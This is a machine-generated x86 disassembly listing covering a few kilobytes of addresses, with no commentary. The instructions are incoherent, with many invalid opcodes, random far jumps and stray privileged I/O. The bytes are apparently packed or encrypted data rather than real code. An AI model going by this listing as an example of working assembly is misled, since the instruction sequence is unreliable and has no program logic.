  41f627:	popf   
  41f628:	add    cl,bh
  41f62a:	loopne 0x41f648
  41f62c:	stos   DWORD PTR es:[edi],eax
  41f62d:	cmp    al,0x51
  41f62f:	fcomip st,st(5)
  41f631:	sbb    eax,0x96c1474f
  41f636:	or     DWORD PTR [eax],ecx
  41f638:	shl    BYTE PTR [edx+0x2ff6cec8],1
  41f63e:	xor    BYTE PTR [esi-0x69],dh
  41f641:	(bad)  
  41f642:	sub    al,0x78
  41f644:	push   0xffffffff
  41f646:	adc    DWORD PTR [edi+0x1],ecx
  41f649:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f64b:	call   0xaddb5fba
  41f650:	pop    es
  41f651:	mov    eax,ds:0x55b9b203
  41f656:	jg     0x41f650
  41f658:	pop    edx
  41f659:	ins    BYTE PTR es:[edi],dx
  41f65a:	mov    ebp,0x5617640b
  41f65f:	ret    
  41f660:	jno    0x41f635
  41f662:	xor    esi,DWORD PTR [edx]
  41f664:	sbb    dh,BYTE PTR [eax]
  41f666:	ins    DWORD PTR es:[edi],dx
  41f667:	das    
  41f668:	in     eax,0xa2
  41f66a:	retf   
  41f66b:	dec    ebp
  41f66c:	add    ah,ch
  41f66e:	xor    ebx,DWORD PTR [ebx+0x65a10192]
  41f674:	add    BYTE PTR [ecx-0x4f2e4f3],ch
  41f67a:	sub    BYTE PTR [ebx],dl
  41f67c:	mov    ah,0x1f
  41f67e:	hlt    
  41f67f:	inc    edi
  41f680:	loope  0x41f613
  41f682:	cmp    eax,0xd5f2344
  41f687:	pop    ebx
  41f688:	scas   al,BYTE PTR es:[edi]
  41f689:	jecxz  0x41f6b2
  41f68b:	push   ebx
  41f68c:	inc    esi
  41f68d:	xchg   esp,eax
  41f68e:	sbb    bl,ah
  41f690:	(bad)  
  41f691:	cmp    edx,DWORD PTR [eax+0x82a6e43]
  41f697:	push   edi
  41f698:	fcmovbe st,st(7)
  41f69a:	imul   esp,DWORD PTR [edi+0x3944885],0x6fb4cab5
  41f6a4:	test   BYTE PTR [edx+0x10],ch
  41f6a7:	pop    edx
  41f6a8:	xor    BYTE PTR [esi-0x67],dl
  41f6ab:	inc    ecx
  41f6ac:	fs inc edi
  41f6ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6af:	pop    ecx
  41f6b0:	fdivrp st(6),st
  41f6b2:	inc    ebp
  41f6b3:	cmp    ebp,DWORD PTR [edi-0x1]
  41f6b6:	add    eax,0xdd92a691
  41f6bb:	sbb    BYTE PTR [esp],0xde
  41f6bf:	or     BYTE PTR [ecx+ebp*8-0x6],0x2
  41f6c4:	and    eax,0x141fad86
  41f6c9:	retf   0x7e09
  41f6cc:	push   esp
  41f6cd:	xor    eax,0xe0635bd1
  41f6d2:	out    dx,eax
  41f6d3:	xor    ebx,esp
  41f6d5:	adc    BYTE PTR [ebp+0x36],0xbc
  41f6d9:	mov    ah,0xa0
  41f6db:	shl    BYTE PTR [ebp-0x40],0x11
  41f6df:	cmp    dl,BYTE PTR [ebp-0x360f5467]
  41f6e5:	adc    BYTE PTR [edi+0x31d258e8],dl
  41f6eb:	(bad)  
  41f6ec:	pop    ecx
  41f6ed:	push   edi
  41f6ee:	dec    edi
  41f6ef:	popa   
  41f6f0:	daa    
  41f6f1:	jge    0x41f744
  41f6f3:	(bad)  [eax+0x3a12b48b]
  41f6f9:	loopne 0x41f6f2
  41f6fb:	add    DWORD PTR [ebx-0x3fec39ae],ebx
  41f701:	or     ah,BYTE PTR [edx]
  41f703:	ror    BYTE PTR [eax-0x6948b7c9],0xd1
  41f70a:	dec    eax
  41f70b:	mov    al,0xb0
  41f70d:	jb     0x41f712
  41f70f:	xchg   BYTE PTR gs:[ecx+0x55],ch
  41f713:	ficom  WORD PTR [ecx+0x2ddb26c6]
  41f719:	jbe    0x41f77b
  41f71b:	test   al,0x73
  41f71d:	push   ebx
  41f71e:	or     BYTE PTR [esi-0x80],0x61
  41f722:	push   esi
  41f723:	int3   
  41f724:	loopne 0x41f6c4
  41f726:	sbb    eax,0x6ba5a5ee
  41f72b:	loope  0x41f775
  41f72d:	ss mov bh,cl
  41f730:	aad    0x32
  41f732:	iret   
  41f733:	data16 cmp bl,BYTE PTR [esi]
  41f736:	stos   BYTE PTR es:[edi],al
  41f737:	pop    esi
  41f738:	ficom  DWORD PTR [esi]
  41f73a:	inc    eax
  41f73b:	(bad)  
  41f73c:	push   0x71bccd09
  41f741:	mov    eax,0x35d0bec6
  41f746:	fcmovne st,st(4)
  41f748:	jmp    0x41f6ec
  41f74a:	mov    BYTE PTR [ebx-0x58],al
  41f74d:	jb     0x41f7ba
  41f74f:	jne    0x41f773
  41f751:	mov    ebx,0xc8c7599e
  41f756:	jno    0x41f733
  41f758:	je     0x41f73d
  41f75a:	inc    edi
  41f75b:	or     BYTE PTR [ebp+0x51bd4fcb],0x2
  41f762:	xor    DWORD PTR [edx+eax*2],edx
  41f765:	jge    0x41f779
  41f767:	or     cl,BYTE PTR [esi]
  41f769:	pop    esp
  41f76a:	mov    DWORD PTR [edx],0x4c87e9be
  41f770:	sub    dl,ch
  41f772:	jb     0x41f7d9
  41f774:	icebp  
  41f775:	jmp    0x41f7cf
  41f777:	push   edi
  41f778:	jmp    0x41f700
  41f77a:	inc    eax
  41f77b:	ins    BYTE PTR es:[edi],dx
  41f77c:	push   ecx
  41f77d:	jl     0x41f752
  41f77f:	ja     0x41f73a
  41f781:	mov    bh,ah
  41f783:	lods   al,BYTE PTR ds:[esi]
  41f784:	adc    DWORD PTR [ecx+eiz*1+0x4563bb4],ebp
  41f78b:	aaa    
  41f78c:	shl    ebp,cl
  41f78e:	mov    esi,DWORD PTR [edi+edx*4-0x1b3f8bff]
  41f795:	mov    WORD PTR [edx+0x76],ss
  41f798:	or     eax,0xace011e8
  41f79d:	add    al,0xe6
  41f79f:	jne    0x41f7c2
  41f7a1:	mov    bl,0x58
  41f7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a4:	and    DWORD PTR [eax+0x7f],ebx
  41f7a7:	sbb    eax,0xb4dc756a
  41f7ac:	and    eax,ecx
  41f7ae:	mov    eax,0x5d541db5
  41f7b3:	repz les esi,FWORD PTR [edi+0x2078ff2b]
  41f7ba:	xor    eax,0x379fccf0
  41f7bf:	push   esp
  41f7c0:	xchg   ebp,eax
  41f7c1:	(bad)  [eax-0x32889b44]
  41f7c7:	xor    BYTE PTR [ecx-0x15],ch
  41f7ca:	ficomp DWORD PTR cs:[eax-0x51]
  41f7ce:	mov    DWORD PTR [edx-0x75],eax
  41f7d1:	fsub   DWORD PTR [edi+0x7b]
  41f7d4:	sbb    eax,0xaafebecd
  41f7d9:	fidivr WORD PTR [edi+eax*8+0x14d365af]
  41f7e0:	mov    cl,0x38
  41f7e2:	(bad)  
  41f7e3:	sub    BYTE PTR [esi-0x79447fa2],cl
  41f7e9:	sub    esp,DWORD PTR [esi+0x2f68db0]
  41f7ef:	inc    ebx
  41f7f0:	cs push esp
  41f7f2:	arpl   WORD PTR [esi-0x18670f8b],ax
  41f7f8:	inc    eax
  41f7f9:	sbb    eax,0xce1a2551
  41f7fe:	mov    ecx,0x327d3836
  41f803:	mov    edi,DWORD PTR [esi+0x6fc65bcf]
  41f809:	xchg   ebp,eax
  41f80a:	int3   
  41f80b:	fbstp  TBYTE PTR [eax]
  41f80d:	mov    dl,0x4b
  41f80f:	aad    0xa3
  41f811:	add    eax,0xc2483001
  41f816:	and    DWORD PTR [esi-0x402290b1],edi
  41f81c:	pop    eax
  41f81d:	push   ecx
  41f81e:	or     eax,0x91828745
  41f823:	cld    
  41f824:	arpl   WORD PTR [esp+ecx*4],dx
  41f827:	fs (bad) 
  41f829:	es jl  0x41f85d
  41f82c:	fist   DWORD PTR [esi-0x2]
  41f82f:	inc    esp
  41f830:	fwait
  41f831:	cmc    
  41f832:	dec    eax
  41f833:	mov    esp,0xdd403b3d
  41f838:	pop    eax
  41f839:	pop    ecx
  41f83a:	jbe    0x41f88c
  41f83c:	pop    ds
  41f83d:	(bad)  
  41f83e:	shl    edi,0x30
  41f841:	stos   DWORD PTR es:[edi],eax
  41f842:	sbb    al,0xc7
  41f844:	push   ecx
  41f845:	cmp    eax,0x26597da2
  41f84a:	add    al,0x4
  41f84c:	pop    ebp
  41f84d:	jo     0x41f831
  41f84f:	out    0x41,al
  41f851:	hlt    
  41f852:	jge    0x41f821
  41f854:	xchg   ecx,eax
  41f855:	rcl    edx,1
  41f857:	sub    esp,DWORD PTR [ebx]
  41f859:	xor    al,0x6f
  41f85b:	jle    0x41f86b
  41f85d:	pop    edx
  41f85e:	pop    ecx
  41f85f:	loope  0x41f874
  41f861:	cmp    al,0xf3
  41f863:	int3   
  41f864:	or     al,0x7c
  41f866:	and    esi,DWORD PTR [esi+0xc]
  41f869:	fstp   TBYTE PTR [edx+0x7f8df7d7]
  41f86f:	mov    eax,ds:0xb8273540
  41f874:	hlt    
  41f875:	mov    ds,WORD PTR [edx]
  41f877:	dec    ebx
  41f878:	cli    
  41f879:	in     al,dx
  41f87a:	push   edi
  41f87b:	pmaddwd mm2,QWORD PTR [esi]
  41f87e:	and    dh,BYTE PTR [ebx-0x6947105]
  41f884:	jl     0x41f8df
  41f886:	out    0x1d,eax
  41f888:	push   ebp
  41f889:	scas   eax,DWORD PTR es:[edi]
  41f88a:	outs   dx,BYTE PTR ds:[esi]
  41f88b:	push   es
  41f88c:	pusha  
  41f88d:	mov    BYTE PTR [ebx+0x327a528f],bl
  41f893:	xor    eax,0x8f2bee21
  41f898:	add    bl,BYTE PTR [eax+0x3e9ba38f]
  41f89e:	scas   eax,DWORD PTR es:[edi]
  41f89f:	sbb    al,0x8e
  41f8a1:	inc    edi
  41f8a2:	pop    ebx
  41f8a3:	xchg   esp,eax
  41f8a4:	in     eax,dx
  41f8a5:	fldenv [eax]
  41f8a7:	xchg   esp,eax
  41f8a8:	pop    ss
  41f8a9:	bswap  esi
  41f8ab:	repz cmp ah,BYTE PTR [esi+0x1cb4f3a9]
  41f8b2:	imul   edi,DWORD PTR [edi-0x2a65a8fe],0xad3bb822
  41f8bc:	jle    0x41f895
  41f8be:	ret    
  41f8bf:	aad    0x1a
  41f8c1:	fcomi  st,st(6)
  41f8c3:	enter  0xb37c,0x58
  41f8c7:	call   0x3dbf:0xd81332a5
  41f8ce:	mov    bh,0xaf
  41f8d0:	out    dx,eax
  41f8d1:	jno    0x41f871
  41f8d3:	cmc    
  41f8d4:	sbb    eax,0xe98a9d16
  41f8d9:	hlt    
  41f8da:	cli    
  41f8db:	mov    edx,0x88d301d4
  41f8e0:	cwde   
  41f8e1:	(bad)  
  41f8e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8e3:	xchg   DWORD PTR [eax+eax*2+0x6b],edx
  41f8e7:	imul   eax,DWORD PTR [ebp-0x1950eabc],0xffffffec
  41f8ee:	pop    esi
  41f8ef:	pop    ebx
  41f8f0:	xchg   BYTE PTR [ebp+eax*1+0x24b32012],dh
  41f8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f8:	(bad)  
  41f8f9:	loope  0x41f8c9
  41f8fb:	nop
  41f8fc:	daa    
  41f8fd:	pop    edi
  41f8fe:	dec    ebx
  41f8ff:	cwde   
  41f900:	lds    edi,FWORD PTR [ecx]
  41f902:	mov    ecx,DWORD PTR [ebx-0x7]
  41f905:	mov    WORD PTR [ecx+eax*4-0x32784d23],gs
  41f90c:	pop    edi
  41f90d:	mov    ds:0xb875da34,al
  41f912:	in     eax,dx
  41f913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f914:	cwde   
  41f915:	cmc    
  41f916:	out    0x8d,eax
  41f918:	or     eax,0x12461d8a
  41f91d:	je     0x41f950
  41f91f:	daa    
  41f920:	adc    al,dl
  41f922:	ss xor esp,0x11
  41f926:	dec    ebx
  41f927:	jmp    0xcbb4af9e
  41f92c:	loope  0x41f976
  41f92e:	nop
  41f92f:	jo     0x41f97d
  41f931:	xchg   esi,eax
  41f932:	imul   eax,DWORD PTR [si],0x6481ea9
  41f939:	fisub  DWORD PTR [ecx]
  41f93b:	sbb    DWORD PTR [ecx],esp
  41f93d:	cmp    al,0x3e
  41f93f:	xor    al,0x72
  41f941:	pop    edi
  41f942:	jae    0x41f980
  41f944:	mov    dl,0xfa
  41f946:	cli    
  41f947:	js     0x41f960
  41f949:	sub    edi,DWORD PTR [esi]
  41f94b:	imul   esi,DWORD PTR [edx+0xd],0x5452bfd9
  41f952:	or     al,0xd
  41f954:	jp     0x41f8f7
  41f956:	dec    edi
  41f957:	sub    al,0xcb
  41f959:	mov    al,0xbc
  41f95b:	jmp    0x7df:0xd9ec39ea
  41f962:	xchg   ecx,eax
  41f963:	rcr    ebp,cl
  41f965:	xor    DWORD PTR [esi-0x29076e55],0x5d
  41f96c:	retf   0x4ab1
  41f96f:	push   ds
  41f970:	xchg   edi,eax
  41f971:	in     al,0x2b
  41f973:	mov    ebx,0xf25a94d9
  41f978:	retf   
  41f979:	add    DWORD PTR [esi],edi
  41f97b:	ins    DWORD PTR es:[edi],dx
  41f97c:	xor    bl,BYTE PTR [edx+0x63]
  41f97f:	mov    ebp,0x3e6d6efb
  41f984:	sbb    eax,0xcf53f22d
  41f989:	mov    dh,0x27
  41f98b:	or     dl,BYTE PTR [ebx]
  41f98d:	inc    esi
  41f98e:	aad    0x35
  41f990:	aaa    
  41f991:	jae    0x41f93e
  41f993:	lds    ebx,FWORD PTR [edi-0x36]
  41f996:	mov    ch,0x45
  41f998:	cld    
  41f999:	lahf   
  41f99a:	jmp    0xd035:0x728dfe6b
  41f9a1:	icebp  
  41f9a2:	dec    eax
  41f9a3:	mov    ds:0x3404f4af,eax
  41f9a8:	aad    0xd6
  41f9aa:	cs push ebp
  41f9ac:	mov    al,0xb8
  41f9ae:	pushf  
  41f9af:	lds    eax,FWORD PTR [edx+0x24]
  41f9b2:	mov    ah,0xd8
  41f9b4:	int3   
  41f9b5:	inc    ebp
  41f9b6:	pushf  
  41f9b7:	lahf   
  41f9b8:	jo     0x41fa2c
  41f9ba:	mov    esp,0xda9e438b
  41f9bf:	ret    0x1a25
  41f9c2:	icebp  
  41f9c3:	js     0x41f9d4
  41f9c5:	mov    ds:0x7ec83895,al
  41f9ca:	loop   0x41fa41
  41f9cc:	enter  0x1200,0x3c
  41f9d0:	clc    
  41f9d1:	lahf   
  41f9d2:	sub    BYTE PTR [edi],dl
  41f9d4:	je     0x41fa46
  41f9d6:	inc    eax
  41f9d7:	and    DWORD PTR [edx+eiz*1],eax
  41f9da:	cmc    
  41f9db:	aaa    
  41f9dc:	ja     0x41fa0e
  41f9de:	xor    ecx,DWORD PTR [esi]
  41f9e0:	fistp  DWORD PTR [edx-0x5241b8c4]
  41f9e6:	data16 sbb cl,BYTE PTR [ebx+0x74fe53a5]
  41f9ed:	popa   
  41f9ee:	shr    DWORD PTR [ecx+edi*4],0x93
  41f9f2:	or     eax,0x3007333d
  41f9f7:	ficomp WORD PTR [esi-0x44]
  41f9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9fb:	cmp    DWORD PTR [ecx-0x19150527],edi
  41fa01:	add    al,0x5
  41fa03:	add    al,bl
  41fa05:	aam    0xa1
  41fa07:	or     BYTE PTR [ecx+0x78],ah
  41fa0a:	sub    edi,esp
  41fa0c:	scas   al,BYTE PTR es:[edi]
  41fa0d:	pop    ds
  41fa0e:	inc    edi
  41fa0f:	xor    bh,BYTE PTR [esi+0x25]
  41fa12:	xor    al,0x2
  41fa14:	repz pop ebx
  41fa16:	or     BYTE PTR [edx+esi*8-0xc50592f],ah
  41fa1d:	std    
  41fa1e:	je     0x41f9d6
  41fa20:	int3   
  41fa21:	imul   ebx,DWORD PTR [esi],0x63
  41fa24:	jecxz  0x41fa31
  41fa26:	pop    ebp
  41fa27:	xchg   DWORD PTR [edx-0x4768da5f],ecx
  41fa2d:	mov    DWORD PTR [eax-0x73],ecx
  41fa30:	push   ds
  41fa31:	rcr    BYTE PTR [ebx],1
  41fa33:	aad    0x26
  41fa35:	mov    bl,BYTE PTR [eax]
  41fa37:	adc    cl,BYTE PTR [eax]
  41fa39:	popf   
  41fa3a:	hlt    
  41fa3b:	data16 xlat BYTE PTR ds:[ebx]
  41fa3d:	mov    cl,0xd3
  41fa3f:	cmp    BYTE PTR [edx+0x6ca06d28],dl
  41fa45:	aam    0xfd
  41fa47:	shl    DWORD PTR [ecx-0x34],cl
  41fa4a:	ret    0x6833
  41fa4d:	icebp  
  41fa4e:	(bad)  
  41fa4f:	mov    esi,0x81749f84
  41fa54:	pop    ebx
  41fa55:	daa    
  41fa56:	push   es
  41fa57:	adc    eax,ebp
  41fa59:	push   ebx
  41fa5a:	mov    dl,0x2d
  41fa5c:	adc    BYTE PTR [edx],bh
  41fa5e:	mov    esp,0xef08ffd9
  41fa63:	mov    es,WORD PTR [edx+ebp*2+0x16310740]
  41fa6a:	data16 (bad) 
  41fa6c:	les    edx,FWORD PTR [ebx-0x67536a73]
  41fa72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa73:	mov    esi,0xd7a862a8
  41fa78:	xchg   edx,eax
  41fa79:	cmp    eax,0xa915a166
  41fa7e:	lods   al,BYTE PTR ds:[esi]
  41fa7f:	mov    DWORD PTR [ebp+eiz*2+0x3b7eeb3d],esi
  41fa86:	pop    ebp
  41fa87:	rol    DWORD PTR [esi],cl
  41fa89:	pushf  
  41fa8a:	lock and BYTE PTR [ebp-0x8],0x15
  41fa8f:	push   esi
  41fa90:	mov    al,ds:0xfb5acdb5
  41fa95:	pop    eax
  41fa96:	cwde   
  41fa97:	jbe    0x41fa52
  41fa99:	int    0xd1
  41fa9b:	dec    edi
  41fa9c:	cmp    ch,cl
  41fa9e:	sbb    cl,BYTE PTR [edi+ebx*1]
  41faa1:	hlt    
  41faa2:	cmp    DWORD PTR [ecx],ebp
  41faa4:	clc    
  41faa5:	jmp    0xa8d78c56
  41faaa:	pop    esi
  41faab:	call   0xb655:0x5a35df9e
  41fab2:	aad    0x84
  41fab4:	fbstp  TBYTE PTR [edi]
  41fab6:	ins    BYTE PTR es:[edi],dx
  41fab7:	fcmovbe st,st(5)
  41fab9:	sub    DWORD PTR [eax-0x7b],ebx
  41fabc:	push   ecx
  41fabd:	xor    eax,0x8e48e26f
  41fac2:	popf   
  41fac3:	sub    BYTE PTR [ebx],bl
  41fac5:	stos   DWORD PTR es:[edi],eax
  41fac6:	(bad)  
  41fac8:	shl    ch,0xf6
  41facb:	imul   DWORD PTR [edx+0x19]
  41face:	add    ch,BYTE PTR [esi]
  41fad0:	fiadd  WORD PTR [ebp+0x6530a465]
  41fad6:	mov    ds:0x2e814307,eax
  41fadb:	call   0x58dda8f0
  41fae0:	aaa    
  41fae1:	mov    al,0xab
  41fae3:	xchg   DWORD PTR [edx+0x6b],ecx
  41fae6:	cdq    
  41fae7:	cli    
  41fae8:	hlt    
  41fae9:	mov    ch,0x4e
  41faeb:	cld    
  41faec:	sub    DWORD PTR [esi-0x36],0x7e
  41faf0:	add    dh,bh
  41faf2:	popf   
  41faf3:	inc    ecx
  41faf4:	es (bad) 
  41faf6:	in     eax,0xe6
  41faf8:	adc    ah,BYTE PTR [ecx-0x61]
  41fafb:	retf   0x27b1
  41fafe:	or     ecx,DWORD PTR [ecx-0x5ce15b79]
  41fb04:	or     BYTE PTR [ecx-0x48bb852f],ah
  41fb0a:	inc    esp
  41fb0b:	jns    0x41fac3
  41fb0d:	cmovo  ebx,esp
  41fb10:	jmp    0x41fb55
  41fb12:	loopne 0x41fb76
  41fb14:	dec    esi
  41fb15:	js     0x41fabd
  41fb17:	and    DWORD PTR [ecx-0x2e],0x97971203
  41fb1e:	retf   
  41fb1f:	xor    BYTE PTR [esi],0x75
  41fb22:	mov    dl,0x4f
  41fb24:	stos   DWORD PTR es:[edi],eax
  41fb25:	sub    DWORD PTR [esp+ebx*4-0x52774aa5],edi
  41fb2c:	xchg   DWORD PTR [di-0x2eee],edi
  41fb31:	dec    eax
  41fb32:	shl    BYTE PTR [ebx+0x10],cl
  41fb35:	fld    QWORD PTR [ebx]
  41fb37:	jo     0x41fb52
  41fb39:	retf   
  41fb3a:	cmc    
  41fb3b:	add    eax,0xe29e721
  41fb40:	cmp    esi,DWORD PTR [esp+ecx*8+0x19]
  41fb44:	sub    eax,0xc5b8f3cb
  41fb49:	mov    dl,0x7d
  41fb4b:	pop    ebx
  41fb4c:	push   esi
  41fb4d:	xor    eax,0xf4207c2d
  41fb52:	dec    esp
  41fb53:	pusha  
  41fb54:	dec    ebp
  41fb55:	popa   
  41fb56:	xchg   ecx,eax
  41fb57:	cmp    cl,BYTE PTR [eax+0x1b731b6f]
  41fb5d:	and    ebp,DWORD PTR [edx]
  41fb5f:	sti    
  41fb60:	(bad)  
  41fb61:	push   edi
  41fb62:	mov    edi,0xfd01f0ce
  41fb67:	push   0xb8d38138
  41fb6c:	repnz stos BYTE PTR es:[edi],al
  41fb6e:	scas   al,BYTE PTR es:[edi]
  41fb6f:	add    eax,0x5caf37e6
  41fb74:	push   0x3f
  41fb76:	add    esi,edx
  41fb78:	vminss xmm7,xmm4,DWORD PTR ds:0xb479721a
  41fb80:	dec    ebp
  41fb81:	retf   
  41fb82:	mov    al,0x4d
  41fb84:	mov    cl,0x96
  41fb86:	and    DWORD PTR [ebp-0x2140d0a6],ebx
  41fb8c:	sub    DWORD PTR [ebx],ebp
  41fb8e:	jmp    0x41fb43
  41fb90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb92:	in     al,dx
  41fb93:	dec    ebp
  41fb94:	stos   BYTE PTR es:[edi],al
  41fb95:	push   eax
  41fb96:	test   eax,0xdd4e3687
  41fb9b:	imul   esp,eax,0x2a9fb2dd
  41fba1:	in     eax,dx
  41fba2:	mov    al,0xcd
  41fba4:	fadd   st(6),st
  41fba6:	xchg   esi,eax
  41fba7:	jl     0x41fbb8
  41fba9:	loop   0x41fbc7
  41fbab:	xchg   edx,eax
  41fbac:	adc    DWORD PTR [eax-0x3e],ebx
  41fbaf:	stos   DWORD PTR es:[edi],eax
  41fbb0:	jmp    0x2f15:0xa172d23e
  41fbb7:	pop    eax
  41fbb8:	cmp    dh,BYTE PTR [ecx-0x46]
  41fbbb:	mov    esi,0x47da9af0
  41fbc0:	mov    bh,0x5a
  41fbc2:	ins    DWORD PTR es:[edi],dx
  41fbc3:	aaa    
  41fbc4:	add    al,0x8d
  41fbc6:	fstp   TBYTE PTR [ebp-0x669f1eef]
  41fbcc:	mov    cl,0x6e
  41fbce:	das    
  41fbcf:	and    DWORD PTR [ebp+ecx*1-0x4f815c80],edx
  41fbd6:	cmp    esi,DWORD PTR [ebx-0x24]
  41fbd9:	push   ss
  41fbda:	mov    ds:0x32965906,al
  41fbdf:	out    0x6d,eax
  41fbe1:	push   edx
  41fbe2:	cli    
  41fbe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbe4:	cmp    eax,0x51745403
  41fbe9:	or     BYTE PTR [eax-0x3a],ch
  41fbec:	retf   0xa9e
  41fbef:	mov    ecx,0x5e74a977
  41fbf4:	sub    ecx,edx
  41fbf6:	mov    bh,0xf5
  41fbf8:	push   esp
  41fbf9:	jp     0x41fbe6
  41fbfb:	or     bl,BYTE PTR [edx+0x3e01dd5c]
  41fc01:	test   ecx,edi
  41fc03:	pop    esi
  41fc04:	cmp    BYTE PTR ss:[eax],0x85
  41fc08:	scas   al,BYTE PTR es:[edi]
  41fc09:	fiadd  WORD PTR cs:[ebp+0x8]
  41fc0d:	sub    DWORD PTR [esi-0x1e],esi
  41fc10:	pop    edx
  41fc11:	inc    esi
  41fc12:	dec    esp
  41fc13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc14:	dec    esp
  41fc15:	loope  0x41fbf8
  41fc17:	dec    eax
  41fc18:	mov    DWORD PTR [edx+0x5dc7f1f9],esi
  41fc1e:	call   0xb9336e6d
  41fc23:	scas   eax,DWORD PTR es:[edi]
  41fc24:	popa   
  41fc25:	call   0x182b:0xdebca372
  41fc2c:	aam    0x23
  41fc2e:	dec    edx
  41fc2f:	cmp    cl,BYTE PTR [edi-0x524586bc]
  41fc35:	dec    edx
  41fc36:	push   ebx
  41fc37:	adc    cl,BYTE PTR [eax]
  41fc39:	jecxz  0x41fc73
  41fc3b:	fisubr DWORD PTR [edx-0x6b]
  41fc3e:	inc    edx
  41fc3f:	pop    ebp
  41fc40:	inc    esp
  41fc41:	push   esi
  41fc42:	in     al,0x5
  41fc44:	into   
  41fc45:	aad    0xb3
  41fc47:	shl    eax,cl
  41fc49:	add    edx,DWORD PTR [esi-0x59275bfb]
  41fc4f:	mov    esi,0x69d79e6b
  41fc54:	mov    ds:0xd2492afe,al
  41fc59:	stos   BYTE PTR es:[edi],al
  41fc5a:	dec    eax
  41fc5b:	ror    BYTE PTR [edi-0x1d877c32],1
  41fc61:	push   esp
  41fc62:	push   ss
  41fc63:	iret   
  41fc64:	push   edx
  41fc65:	loopne 0x41fcae
  41fc67:	jg     0x41fcd3
  41fc69:	lea    ebx,[ecx+0x78de6b60]
  41fc6f:	retf   0x10bc
  41fc72:	sub    ecx,ecx
  41fc74:	mov    eax,ds:0xa1d8004
  41fc79:	call   0x5d7d9f64
  41fc7e:	gs jl  0x41fc22
  41fc81:	add    ebp,DWORD PTR [esi-0x899494d]
  41fc87:	jno    0x41fcb9
  41fc89:	(bad)  [edx+0x104cfe49]
  41fc8f:	arpl   WORD PTR [edi-0x46],si
  41fc92:	jmp    0xe831e9fa
  41fc97:	in     al,0xe6
  41fc99:	std    
  41fc9a:	add    BYTE PTR [esi+edi*2],cl
  41fc9d:	jmp    0x41fc6b
  41fc9f:	pop    edx
  41fca0:	mov    dh,0x6f
  41fca2:	fst    DWORD PTR [ebp-0x3087a4fc]
  41fca8:	cld    
  41fca9:	jmp    0xc587c246
  41fcae:	std    
  41fcaf:	out    0x7d,eax
  41fcb1:	outs   dx,BYTE PTR ds:[esi]
  41fcb2:	pop    ecx
  41fcb4:	arpl   WORD PTR [eax],sp
  41fcb6:	xchg   ebx,eax
  41fcb7:	mov    al,0x5e
  41fcb9:	stos   BYTE PTR es:[edi],al
  41fcba:	push   ds
  41fcbb:	test   al,0xda
  41fcbd:	cmp    DWORD PTR [edx+0x5e268a90],edi
  41fcc3:	lods   al,BYTE PTR ds:[esi]
  41fcc4:	jae    0x41fcc0
  41fcc6:	iret   
  41fcc7:	imul   esi,DWORD PTR [edi-0x2c],0xcc6bd85f
  41fcce:	cmp    ebp,0x9dc77705
  41fcd4:	int3   
  41fcd5:	imul   eax,DWORD PTR [esi],0x141ba515
  41fcdb:	jmp    0x41fd38
  41fcdd:	les    eax,FWORD PTR [ebx+0x49]
  41fce0:	out    0x3e,al
  41fce2:	xchg   edx,eax
  41fce3:	cmp    esi,esp
  41fce5:	nop
  41fce6:	add    al,0x70
  41fce8:	dec    esi
  41fce9:	mov    bl,0x6
  41fceb:	pop    edx
  41fcec:	inc    ebp
  41fced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcee:	xor    ecx,esp
  41fcf0:	mov    dl,0xca
  41fcf2:	mov    DWORD PTR [ebp+0x6bba3e4f],ebp
  41fcf8:	add    eax,0xb8fbd21b
  41fcfd:	unpckhps xmm5,XMMWORD PTR [edx-0x6a]
  41fd01:	imul   esp,eax,0x78fee519
  41fd07:	cmp    ch,bl
  41fd09:	add    esp,DWORD PTR [eax]
  41fd0b:	mov    bh,0xa5
  41fd0d:	and    eax,0x8a943e1c
  41fd12:	xor    DWORD PTR [eax+ebx*8-0x7f9367df],edi
  41fd19:	mov    bh,dl
  41fd1b:	and    DWORD PTR [edx+0x7947cf41],0x35
  41fd22:	cli    
  41fd23:	imul   ebp,DWORD PTR [ecx+0x17207fed],0xef9e4fa1
  41fd2d:	adc    al,0x44
  41fd2f:	call   0x5d86:0x568cc5e5
  41fd36:	imul   esi,DWORD PTR [ecx-0x776311df],0xffffff8d
  41fd3d:	mul    bl
  41fd3f:	dec    esi
  41fd40:	add    ch,bh
  41fd42:	and    ah,BYTE PTR [eax-0x31c6b51d]
  41fd48:	pop    edi
  41fd49:	sbb    al,0xe4
  41fd4b:	out    0x47,eax
  41fd4d:	or     esp,DWORD PTR ds:0x92a0340c
  41fd53:	push   DWORD PTR [edx+0x42]
  41fd56:	pop    esp
  41fd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd5a:	(bad)  
  41fd5b:	retf   0xb120
  41fd5e:	es jbe 0x41fdcf
  41fd61:	xor    ebx,DWORD PTR [ecx+0x58]
  41fd64:	sbb    edi,DWORD PTR [ebx]
  41fd66:	call   0x98adc8cd
  41fd6b:	(bad)  
  41fd6c:	and    DWORD PTR [edi],esp
  41fd6e:	pushf  
  41fd6f:	daa    
  41fd70:	xchg   esp,eax
  41fd71:	fsub   DWORD PTR [edi+0x3c243462]
  41fd77:	xor    al,0xe7
  41fd79:	es pushf 
  41fd7b:	mov    al,0x62
  41fd7d:	fidiv  WORD PTR [ebx+0x7441f821]
  41fd83:	imul   DWORD PTR [ebp-0x230f1a32]
  41fd89:	mov    dh,al
  41fd8b:	(bad)  
  41fd8c:	jb     0x41fddd
  41fd8e:	lock mov dx,0x8933
  41fd93:	cmp    BYTE PTR [edi-0x66a1fada],0x5
  41fd9a:	loope  0x41fda7
  41fd9c:	sub    dl,0xf6
  41fd9f:	sub    DWORD PTR [ecx-0x1f],0xf97d39ff
  41fda6:	xchg   ebx,eax
